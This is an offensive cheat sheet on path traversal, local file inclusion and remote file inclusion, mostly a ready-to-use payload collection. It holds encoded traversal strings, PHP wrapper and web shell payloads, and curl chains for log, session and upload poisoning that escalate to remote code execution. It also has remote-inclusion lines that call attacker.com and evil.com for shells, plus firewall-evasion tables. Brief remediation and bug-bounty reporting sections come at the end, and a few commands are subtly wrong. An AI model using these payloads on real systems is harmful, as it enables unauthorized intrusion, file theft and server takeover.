


# 🔐 **ULTIMATE CHEAT SHEET: Path Traversal / LFI / RFI**

---

## 📊 **PART 1: QUICK DIFFERENCES**

| Feature | **Path Traversal (PT)** | **LFI** | **RFI** |
|---------|------------------------|---------|---------|
| **Full Name** | Path/Directory Traversal | Local File Inclusion | Remote File Inclusion |
| **What it does** | Read files on server | Include & execute local files | Include & execute remote files |
| **Dangerous Functions** | `readfile()`, `fopen()`, `file_get_contents()` | `include()`, `require()` | `include()` + `allow_url_include=On` |
| **Result** | 📄 Read sensitive files | ⚡ Execute code → RCE | 💥 Direct Remote Code Execution |
| **Priority** | P3-P4 (Medium) | P1-P2 (High) | P1 (Critical) |
| **CVSS Score** | 5.3 - 6.5 | 7.5 - 9.8 | 9.8 - 10.0 |

> 💡 **Golden Rule**: 
> - If the function **reads** → Think **Path Traversal**
> - If the function **executes** → Think **LFI/RFI**

---

## 🧠 **PART 2: HACKER MINDSET (How to Think)**

### 🔍 **Step 1: Find the Entry Point**

```bash
# Look for parameters that accept file names or paths:
?page=    &file=    &path=    &template=
&doc=     &include= &lang=    &redirect=
&download= &load=   &conf=    &config=

# Check these places:
✅ URL parameters: /page?file=home
✅ POST data: {"image": "avatar.jpg"}
✅ Headers: X-Template: main
✅ Cookies: theme=dark.php
✅ File uploads: filename=shell.jpg
```

### 🔍 **Step 2: Ask These Questions**

```bash
Q1: Does the app add an extension automatically?
    → Try: ../../../etc/passwd%00  (Null Byte)

Q2: Does it filter "../" ?
    → Try: ....//  or  ..%2f  or  %252e%252e%252f

Q3: Is it checking the start of the path?
    → Try: /var/www/../../../etc/passwd

Q4: Can I upload files?
    → Try: Upload malicious file + include it via LFI

Q5: Is allow_url_include enabled? (for RFI)
    → Try: ?page=http://attacker.com/shell.php
```

### 🔍 **Step 3: Test Behavior**

```bash
# Send normal request
GET /page?file=home → Response: OK (200)

# Send traversal request  
GET /page?file=../../../etc/passwd → Response: ?

# Analyze response:
✅ Contains "root:x:" → VULNERABLE (PT/LFI)
✅ Contains "<?php" → VULNERABLE (LFI - source leak)
✅ Executes command → VULNERABLE (LFI/RFI - RCE)
❌ 404/500 error → Maybe filtered, try bypasses
❌ Same as normal → Probably not vulnerable
```

---

## 📦 **PART 3: PAYLOADS CHEAT SHEET**

### **A. PATH TRAVERSAL PAYLOADS**

```bash
# === BASIC ===
../../../etc/passwd
..\..\..\..\windows\win.ini
..%2f..%2f..%2fetc%2fpasswd

# === DEPTH TESTING (try different levels) ===
../etc/passwd
../../etc/passwd  
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# === URL ENCODING ===
%2e%2e%2f = ../
%252e%252e%252f = ../ (double encoded)
%c0%ae%c0%ae%c0%af = ../ (UTF-8 overlong)
%u002e%u002e%u2215 = ../ (Unicode)

# === NULL BYTE (PHP < 5.3.4) ===
../../../etc/passwd%00
../../../etc/passwd%2500

# === MANGLING (bypass filter that removes ../ once) ===
....//....//....//etc/passwd
....\\....\\....\\windows\\win.ini
..././..././..././etc/passwd

# === ABSOLUTE PATHS ===
/etc/passwd
/var/www/html/config.php
C:\Windows\win.ini
C:\xampp\apache\conf\httpd.conf

# === MIXED/COMBO ===
..%2f..%2f..%5cetc/passwd
%2e%2e/%2e%2e\etc/passwd
....//%2e%2e/etc/passwd
```

---

### **B. LFI PAYLOADS**

```bash
# === BASIC LFI ===
?page=../../../etc/passwd
?page=....//....//....//etc/passwd

# === PHP WRAPPERS ===

# Read source code (base64)
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php

# Read with rot13 (simple encoding)
php://filter/read=string.rot13/resource=index.php

# Execute POST data
?page=php://input
# Then send in POST body: <?php system($_GET['cmd']); ?>

# Execute direct code
?page=data://text/plain,<?php system('id');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# Execute system command (if expect extension enabled)
?page=expect://id
?page=expect://ls -la

# === LOG POISONING ===
# Step 1: Poison log via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2: Include log file
?page=../../../../var/log/apache2/access.log&cmd=id
?page=../../../../var/log/nginx/access.log&cmd=id
?page=../../../../var/log/auth.log&cmd=id  # SSH logs

# === SESSION FILE INCLUSION ===
# Step 1: Poison session via parameter
?user=<?php system(\$_GET['cmd']); ?>

# Step 2: Include session file
?page=/var/lib/php/sessions/sess_[PHPSESSID]&cmd=id
?page=/var/lib/php5/sessions/sess_[PHPSESSID]&cmd=id
?page=/tmp/sess_[PHPSESSID]&cmd=id

# === /proc/ FILESYSTEM (Linux) ===
?page=/proc/self/environ&cmd=id  # Put code in User-Agent
?page=/proc/self/cmdline
?page=/proc/self/fd/3  # Brute force FD number
?page=/proc/[PID]/environ  # Brute force PID

# === ZIP/PHAR WRAPPERS ===
# Upload shell.php inside shell.jpg (actually a ZIP)
# Then include:
?page=zip://uploads/shell.jpg%23shell.php
?page=phar://uploads/archive.phar/shell.php
```

---

### **C. RFI PAYLOADS**

```bash
# === BASIC RFI (needs allow_url_include=On) ===
?page=http://attacker.com/shell.php
?page=https://attacker.com/shell.txt
?page=ftp://attacker.com/shell.php

# === PROTOCOL BYPASSES ===
?page=//attacker.com/shell.php  # Protocol-relative
?page=file://attacker.com/shell.php

# === DATA WRAPPER (no allow_url_include needed) ===
?page=data://text/plain,<?php system('id');?>
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+

# === SMB PROTOCOL (Windows) ===
?page=\\attacker.com\share\shell.php

# === PHP FILTER CHAIN (Advanced RFI) ===
?page=php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4+.php
```

---

## 🛡️ **PART 4: WAF BYPASS TECHNIQUES**


## 🔍 **Why WAFs Block File Inclusion & How They Work**
Most WAFs use **regex rules** to block:
- `../` or `..\` (traversal)
- `etc/passwd`, `win.ini`, `shadow` (sensitive files)
- `php://`, `data://`, `expect://` (wrappers)
- `http://`, `https://` (RFI)

---

## 🧩 **1. Encoding & Double Encoding Bypasses**

| Technique | Payload Example | Why It Works |
|-----------|----------------|--------------|
| **Single URL Encode** | `..%2f..%2f..%2fetc%2fpasswd` | Basic bypass for weak regex |
| **Double URL Encode** | `..%252f..%252f..%252fetc%252fpasswd` | WAF decodes once → sees `%2f`. Backend decodes again → gets `../` |
| **Unicode/UTF-8** | `%c0%ae%c0%ae%c0%af` = `../` | WAF doesn't normalize overlong UTF-8 |
| **Fullwidth Characters** | `％２ｅ％２ｅ％２ｆ` | Looks like `../` to humans, bypasses ASCII regex |

**💡 Pro Tip:** If WAF blocks `%2f`, try mixing encodings: `..%2f..%252fetc/passwd`

---

## 🔄 **2. Path Normalization & Canonicalization Tricks**

| Technique | Payload Example | Why It Works |
|-----------|----------------|--------------|
| **Mangled Path** | `....//....//....//etc/passwd` | WAF removes `../` **once** → leaves `../` behind |
| **Slash Mixing** | `..%5c..%5c..%2fetc/passwd` | Confuses Windows/Linux path parsers |
| **Absolute + Relative** | `/var/www/../../etc/passwd` | Passes "starts with allowed dir" check, then escapes |
| **Trailing/Leading Junk** | `../../../etc/passwd/./././/` | WAF regex expects clean path, backend normalizes it |
| **Null Byte** | `../../../etc/passwd%00.png` | Cuts string before appended extension (PHP < 5.3.4) |
| **Comment Injection** | `../../../etc/*passwd*/` or `../../../etc/pa**/sswd` | Bypasses keyword matching |

---

## 🌐 **3. Wrapper & Protocol Bypasses**

| Technique | Payload Example | Why It Works |
|-----------|----------------|--------------|
| **Case Manipulation** | `PhP://FiLtEr/convert.base64-encode/resource=index.php` | WAF rules are often case-sensitive |
| **Data URI** | `//text/plain,<?php system('id');?>` | Bypasses `http://` blocks |
| **Protocol Relative** | `//attacker.com/shell.php` | Skips `http:`/`https:` filters |
| **SMB/UNC (Windows)** | `\\\\10.0.0.1\\share\\shell.php` | WAF rarely inspects `\\` paths |
| **ZIP/PHAR** | `zip://uploads/img.jpg%23shell.php` | WAF sees `.jpg`, backend extracts `shell.php` |
| **Filter Chain** | `php://filter/convert.base64-decode/resource=data://plain/text,<base64>` | Bypasses both path & extension checks |

**💡 Pro Tip:** Wrap bypasses in double encoding if WAF blocks `://`:  
`php%3a%2f%2ffilter/convert.base64-encode/resource=index.php`

---

## 📦 **4. HTTP Parsing & WAF Logic Flaws**

| Technique | Payload Example | Why It Works |
|-----------|----------------|--------------|
| **HTTP Parameter Pollution (HPP)** | `?file=safe.txt&file=../../../etc/passwd` | WAF checks first `file`, backend uses last |
| **Fragment/Query Trick** | `?file=../../../etc/passwd#` or `?file=../../../etc/passwd?` | WAF strips `#`/`?`, backend ignores them |
| **Header Forwarding** | `X-Original-URL: /vuln?page=../../../etc/passwd` | Bypasses URL inspection, hits app logic |
| **Chunked Transfer-Encoding** | Split payload across multiple chunks | Regex fails on fragmented body |
| **JSON vs Form** | Send `{"file":"../../../etc/passwd"}` instead of `file=...` | WAF may only inspect `application/x-www-form-urlencoded` |

---

## 🛠️ **5. How to Test & Automate WAF Bypasses**

### **Useful Tools**
| Tool | Command Example | Purpose |
|------|----------------|---------|
| **ffuf** | `ffuf -w bypass.txt -u "https://target/page?file=FUZZ" -mc 200 -mr "root:x:"` | Fast fuzzing |
| **wfuzz** | `wfuzz -c -z file,bypass.txt -u "https://target/page?file=FUZZ" --hw 150` | Advanced filtering |
| **nuclei** | `nuclei -u https://target -t lfi/ -tags waf-bypass` | Template-based |
| **Burp Intruder** | Load `bypass payloads` → Sniper/Pitchfork → Match response size/code | Manual precision |
| **curl** | `curl -v -H "User-Agent: BypassTest" "https://target/page?file=FUZZ"` | Quick validation |

### **Payload Lists (Ready to Use)**

```bash

# Or create your own `bypass.txt`:
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd
%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
../../../etc/passwd%00
..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc..%2Fpasswd..%2F00.txt//.%00
php://filter/convert.base64-encode/resource=index.php
//text/plain,<?php system('id');?>
zip://uploads/shell.jpg%23shell.php
```

---

## 📊 **6. Quick WAF Bypass Reference Card**

| WAF Blocks | Try This First |
|------------|----------------|
| `../` or `..\` | `..%2f`, `..%5c`, `....//`, `%c0%ae%c0%ae%c0%af` |
| `etc/passwd` keyword | `e%74c/p%61sswd`, `et%63/pass%77d`, `etc/pa**/sswd` |
| `php://` wrapper | `PhP://FiLtEr/`, `php%3a%2f%2f`, `//filter/` |
| `.php` extension added | `%00`, `?.`, `#`, `php://filter/...` |
| `http://` for RFI | `//`, `data://`, `php://filter/resource=http://...` |
| Exact string match | HPP: `?f=safe&f=../../../`, change `Content-Type` |

---

## 💡 **7. Pro Tips for WAF Testing** 

1. **Fingerprint the WAF first**  
   ```bash
   curl -I https://target.com | grep -i "server\|cf-\|x-amz\|x-sucuri"
   ```
   *(Cloudflare, AWS WAF, ModSecurity, Sucurai, Akamai all behave differently)*

2. **Don't spray payloads blindly**  
   WAFs rate-limit & ban IPs. Test 1 payload at a time, wait 5-10s between requests.

3. **Use Burp Collaborator for blind bypasses**  
   If response doesn't change, trigger DNS/HTTP callback:  
   `?file=//attacker.burpcollaborator.net/`

4. **Check for reverse proxy normalization gaps**  
   Nginx + Apache + Tomcat often parse `../` differently. Test `..;/` or `%2e%2e%2f%2e%2e%2f`

5. **Document the bypass clearly in your report**  
   ```markdown
   WAF Bypass Used: Double URL Encoding + Mangled Path
   Original Payload: ../../../etc/passwd (Blocked: 403)
   Working Payload: ..%252f..%252f..%252fetc%252fpasswd (Allowed: 200 + file content)
   Reason: WAF decodes once, backend decodes twice → traversal succeeds
   ```

---

## 🎯 **PART 5: EXPLOITATION METHODS (LFI → RCE)**

### **Method 1: Log Poisoning (Most Reliable)**

```bash
# 1. Inject PHP code into Apache/Nginx log
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Include the poisoned log via LFI
curl "http://target.com/page?file=../../../../var/log/apache2/access.log&cmd=id"

# 3. Get output: uid=33(www-data)...
```

### **Method 2: PHP Session Poisoning**

```bash
# 1. Find a parameter stored in session (user, lang, theme)
curl "http://target.com/login?user=<?php system(\$_GET['cmd']); ?>"

# 2. Get PHPSESSID from cookies
# 3. Include session file
curl "http://target.com/page?file=/var/lib/php/sessions/sess_abc123&cmd=id"
```

### **Method 3: File Upload + LFI**

```bash
# 1. Upload image with PHP code in metadata
echo "<?php system(\$_GET['cmd']); ?>" >> shell.jpg

# 2. Upload via form
curl -F "file=@shell.jpg" http://target.com/upload

# 3. Include uploaded file
curl "http://target.com/page?file=../../uploads/shell.jpg&cmd=id"
```

### **Method 4: PHP Wrappers (No File Needed)**

```bash
# Execute via php://input
curl -X POST "http://target.com/page?file=php://input" \
  -d "<?php system('id'); ?>"

# Execute via data://
curl "http://target.com/page?file=data://text/plain,<?php system('id');?>"
```

### **Method 5: /proc/self/environ**

```bash
# 1. Put code in User-Agent header
curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Read environ file
curl "http://target.com/page?file=../../../proc/self/environ&cmd=id"
```

---

## 🛠️ **PART 6: TOOLS & AUTOMATION**

### **Automated Scanners**

```bash
# ffuf (fast fuzzing)
ffuf -w lfi payloads.txt -u "http://target/page?file=FUZZ" \
  -mc 200 -mr "root:x:" -t 50

# wfuzz (advanced fuzzing)  
wfuzz -c -z file,lfi.txt -u "http://target/page?file=FUZZ" --hh 0

# dotdotpwn (LFI specialized)
dotdotpwn -m http -h target.com -f /etc/passwd -k root -d 5

# nuclei (template-based)
nuclei -u http://target.com -t lfi/ -tags lfi,rfi

# arjun (find hidden parameters)
arjun -u http://target.com/page -oT params.txt
```

### **Exploitation Tools**

```bash
# LFISuite (all-in-one LFI tool)
git clone https://github.com/D35m0nd142/LFISuite
python3 lfi.py -u http://target -p page

# Kadimus (LFI/RFI scanner)
git clone https://github.com/P0cL4bs/Kadimus
./kadimus -u http://target -p page -f index.php

# fimap (automatic LFI exploiter)
git clone https://github.com/kurobeats/fimap
python3 fimap.py -u "http://target/page?page=FUZZ"

# phpGGC (PHAR gadget chains)
git clone https://github.com/ambionics/phpggc
php phpgc PHPGGC/RCE/system id -o shell.phar
```

### **Wordlists (Payload Lists)**

```bash
# Download from PayloadsAllTheThings
git clone https://github.com/swisskyrepo/PayloadsAllTheThings
cd PayloadsAllTheThings/File\ Inclusion/

# Useful lists:
- lfi-linux.txt      # Linux file paths
- lfi-windows.txt    # Windows file paths  
- lfi-bypasses.txt   # Encoding/bypass payloads
- wrappers.txt       # PHP wrapper payloads
- files-to-read.txt  # Sensitive files list

# SecLists (another great source)
git clone https://github.com/danielmiessler/SecLists
cd SecLists/Fuzzing/LFI/
```

---

## 🧪 **PART 7: TESTING METHODOLOGY (Step-by-Step)**

### **Phase 1: Reconnaissance**

```bash
# 1. Find file-related parameters
arjun -u http://target.com/page -oT params.txt

# 2. Check JavaScript for API endpoints
gau target.com | grep -iE "file|path|include" | sort -u

# 3. Use Burp Param Miner
# Right-click request → Engagement tools → Find parameters
```

### **Phase 2: Basic Testing**

```bash
# Test basic traversal
curl "http://target/page?file=../../../etc/passwd" | grep "root:x:"

# Test Windows if Linux fails
curl "http://target/page?file=../../../windows/win.ini" | grep "bit app"

# Test absolute path bypass
curl "http://target/page?file=/etc/passwd"
```

### **Phase 3: Bypass Testing**

```bash
# If filtered, try encodings:
curl "http://target/page?file=..%252f..%252fetc%252fpasswd"

# If extension added, try null byte:
curl "http://target/page?file=../../../etc/passwd%00"

# If ../ removed once, try mangling:
curl "http://target/page?file=....//....//etc/passwd"
```

### **Phase 4: Escalation (LFI → RCE)**

```bash
# Try log poisoning first (most reliable)
curl -A "<?php system(\$_GET['c']); ?>" http://target/
curl "http://target/page?file=../../../../var/log/apache2/access.log&c=id"

# Try session poisoning
curl "http://target/login?lang=<?php system(\$_GET['c']); ?>"
curl "http://target/page?file=/var/lib/php/sessions/sess_XXX&c=id"

# Try PHP wrappers
curl "http://target/page?file=php://input" -d "<?php system('id');?>"
```

### **Phase 5: Proof & Documentation**


```bash
# Save evidence
curl "http://target/page?file=../../../etc/passwd" > proof_pt.txt
curl "http://target/page?file=php://filter/.../index.php" | base64 -d > source.php

# Take screenshots
# Record video PoC (2 minutes max)

# Write clear report with:
✅ Steps to reproduce
✅ Impact explanation  
✅ CVSS score
✅ Remediation suggestions
```

---

## 🎯 **PART 8: WHERE TO LOOK (Common Locations)**

### **URL Parameters**

```
?page=    &file=    &path=    &template=
&doc=     &include= &lang=    &redirect=
&download=&load=    &conf=    &config=
&img=     &avatar=  &logo=    &theme=
```

### **POST Parameters (JSON/Form)**

```json
{"file": "document.pdf"}
{"image": "avatar.jpg"}  
{"template": "main.html"}
{"config": "settings.ini"}
```

### **Headers**

```
X-Template: main.php
X-File-Path: /var/log/app.log
Referer: http://evil.com/shell.php  # For RFI
User-Agent: <?php system('id');?>    # For log poisoning
```

### **Cookies**

```
theme=dark.php
lang=en_us.php
session_file=/var/lib/php/sessions/sess_abc
```

### **File Upload Features**

```
✅ Profile picture upload
✅ Document upload  
✅ Backup/restore feature
✅ Log download feature
✅ Theme/template upload
```

---

## 🛡️ **PART 9: REMEDIATION (For Developers)**

### **Secure Code Examples**

```php
// ❌ VULNERABLE
include($_GET['page'] . ".php");

// ✅ SECURE: Allowlist + basename + realpath
$allowed = ['home', 'about', 'contact'];
$page = basename($_GET['page'] ?? 'home');

if (in_array($page, $allowed, true)) {
    $target = realpath(__DIR__ . "/pages/{$page}.php");
    $base = realpath(__DIR__ . '/pages');
    
    if ($target && strpos($target, $base) === 0 && file_exists($target)) {
        include($target);
    }
}
```

### **Server Configuration**

```ini
# php.ini - Disable dangerous features
allow_url_include = Off
allow_url_fopen = Off  
open_basedir = /var/www/html:/tmp
disable_functions = exec,system,passthru,shell_exec

# Apache (.htaccess) - Block PHP execution in upload folders
<Directory "/var/www/html/uploads">
    <FilesMatch "\.php$">
        Require all denied
    </FilesMatch>
    php_flag engine off
</Directory>
```

### **Security Checklist**

```markdown
✅ Never pass user input directly to include/read functions
✅ Use allowlist for acceptable filenames  
✅ Normalize paths with realpath() before validation
✅ Disable allow_url_include in production
✅ Run web server with least privileges
✅ Separate upload directories from executable directories
✅ Log and monitor suspicious file access attempts
✅ Regular security scanning with automated tools
```

---

## 🚀 **PART 9: BUG BOUNTY TIPS**

### **Before Submitting:**

```markdown
✅ Test on multiple times (ensure it's not cached)
✅ Try from different IP/network (ensure not IP-based)
✅ Document exact request/response (copy-paste ready)
✅ Remove any real sensitive data from screenshots
✅ Calculate CVSS score with justification
✅ Suggest practical fixes (not just "fix the code")
```

### **Report Template (Short Version):**

```markdown
Title: Local File Inclusion in [parameter] leads to [Impact]

Summary: The [param] parameter in [endpoint] allows reading arbitrary files via path traversal. Combined with [technique], this leads to [RCE/data leak].

Steps:
1. Send: GET /page?file=../../../etc/passwd
2. Response contains: root:x:0:0:...
3. Escalation: [optional RCE steps]

Impact: [Explain business impact]
CVSS: [Score] - [Vector]

Remediation: [Practical fix suggestions]
```

---

## 🎁 **BONUS: ONE-LINERS FOR QUICK TESTING**

```bash
# Quick PT test
curl -s "http://target/page?file=../../../etc/passwd" | grep -q "root:x:" && echo "✅ VULNERABLE"

# Quick LFI source leak test  
curl -s "http://target/page?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d | grep -q "<?php" && echo "✅ SOURCE LEAK"

# Quick RCE via log poisoning
curl -s -A "<?php system('id');?>" http://target/ > /dev/null && curl -s "http://target/page?file=../../../../var/log/apache2/access.log" | grep -q "uid=" && echo "✅ RCE"

# Quick RFI test (if allow_url_include might be on)
curl -s "http://target/page?file=http://attacker.com/test.txt" | grep -q "test" && echo "✅ RFI POSSIBLE"

# Quick wrapper test
curl -s "http://target/page?file=php://info" | grep -q "PHP Version" && echo "✅ PHP Wrappers Enabled"
```

---

> 💡 **Final Pro Tip**: 
> *"Don't just memorize payloads. Understand WHY they work. The filter changes, but the logic stays the same. Think like the developer, then break what they built."*

